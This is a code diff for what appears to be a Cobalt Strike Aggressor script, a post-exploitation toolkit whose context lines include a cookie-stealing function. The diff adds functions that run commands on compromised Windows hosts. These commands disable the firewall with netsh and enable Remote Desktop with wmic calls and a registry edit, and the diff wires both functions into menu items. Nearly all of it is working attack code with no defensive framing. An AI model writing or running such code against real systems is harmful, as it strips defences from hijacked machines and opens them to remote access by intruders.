@@ -46,6 +46,24 @@ sub Steal_cookies{
     }
 }
 
+sub Close_firewall{
+   $ver = beacon_info($1['@'],"ver");
+   if (double($ver) lt 5.2){
+       brun($1, "netsh firewall set opmode disable");
+       return;
+   }
+   brun($1, "netsh advfirewall set allprofiles state off");
+}
+sub Open_rdp{
+   $ver = beacon_info($1['@'],"ver");
+   if (double($ver) lt 5.2){
+       brun($1, "wmic path win32_terminalservicesetting where (__CLASS !=\"\") call setallowtsconnections 1");
+       return;
+   }
+   brun($1, "wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=\"\") call setallowtsconnections 1");
+   brun($1, "wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1");
+   brun($1, "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f");
+}
 #append menus
 
 
@@ -59,10 +77,9 @@ sub Steal_cookies{
             item "Turn Off Firewall"{
                 if (!-isadmin $1['@']){
                     show_error("Permission Denied!");
+                    return;
                 }
-                else{
-                    bshell($1, "cmd.exe /C netsh advfirewall set allprofiles state off");
-                }
+                Close_firewall($1);
             }
 
             item "Enable RDP"{
@@ -70,10 +87,9 @@ sub Steal_cookies{
                 $bid = $1;
                 if (!-isadmin $bid['@']){
                     show_error("Permission Denied!");
+                    return;
                 }
-                else{
-                    bshell($bid,"REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f");
-                }
+                Open_rdp($1);
             }
 
             menu "Power"{
